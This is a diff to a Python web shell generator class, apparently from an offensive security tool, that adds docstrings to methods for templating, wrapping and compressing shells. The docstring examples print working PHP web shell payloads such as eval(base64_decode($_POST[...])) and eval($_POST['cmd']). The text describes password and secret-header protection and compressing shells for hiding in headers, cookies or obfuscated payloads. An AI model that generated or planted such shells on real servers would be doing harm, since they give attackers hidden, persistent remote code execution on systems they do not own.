@@ -11,9 +11,29 @@ logger = logging.getLogger(settings.app_branding)
 
 
 class WebShell:
-    """Base class for web shell generation"""
+    """Base class for web shell generation with template management.
 
-    # Class-level custom template registry
+    Provides common functionality for generating web shells in various languages
+    (PHP, JSP, ASP, ASPX) with password protection, custom encoders, and secret
+    header authentication.
+
+    Attributes:
+        password: Password parameter name for webshell access
+        encoder: Encoding method ('default', 'base64', etc.)
+        secret_header: Optional HTTP header for additional authentication
+        secret_value: Value for the secret header
+        prefix: Code prepended to webshell
+        suffix: Code appended to webshell
+        _custom_templates: Class-level registry of custom templates
+
+    Example:
+        >>> shell = WebShell(password='mypass', encoder='base64')
+        >>> template = '<?php eval(base64_decode($_POST["{{PASSWORD}}"])); ?>'
+        >>> code = shell.apply_template(template)
+        >>> code
+        '<?php eval(base64_decode($_POST["mypass"])); ?>'
+    """
+
     _custom_templates: dict[str, str] = {}
 
     def __init__(
@@ -44,15 +64,41 @@ class WebShell:
         self.suffix = suffix
 
     def wrap_code(self, code: str) -> str:
-        """Wrap code with prefix and suffix"""
+        """Wrap code with configured prefix and suffix.
+
+        Args:
+            code: Core webshell code to wrap
+
+        Returns:
+            Code with prefix and suffix applied
+
+        Example:
+            >>> shell = WebShell(prefix='<?php ', suffix=' ?>')
+            >>> shell.wrap_code('eval($_POST["cmd"]);')
+            '<?php eval($_POST["cmd"]); ?>'
+        """
         return f"{self.prefix}{code}{self.suffix}"
 
     def make_inline(self, code: str) -> str:
-        """Remove whitespace for inline usage"""
+        """Compress code to single line by removing excess whitespace.
+
+        Useful for embedding webshells in tight spaces like HTTP headers,
+        cookies, or obfuscated payloads.
+
+        Args:
+            code: Multi-line code to compress
+
+        Returns:
+            Compressed single-line code
+
+        Example:
+            >>> shell = WebShell()
+            >>> shell.make_inline('<?php\n  eval(\n    $_POST["cmd"]\n  );\n?>')
+            '<?php eval( $_POST["cmd"] ); ?>'
+        """
         code = code.replace("\t", " ")
         code = code.replace("\r", " ")
         code = code.replace("\n", " ")
-        # Remove multiple spaces
         while "  " in code:
             code = code.replace("  ", " ")
         return code.strip()
@@ -69,7 +115,6 @@ class WebShell:
         """
         code = template.replace("{{PASSWORD}}", self.password)
 
-        # Apply authentication header if configured
         if self.secret_header and self.secret_value:
             code = code.replace(
                 "{{SECRET_HEADER}}", self.secret_header.upper().replace("-", "_")
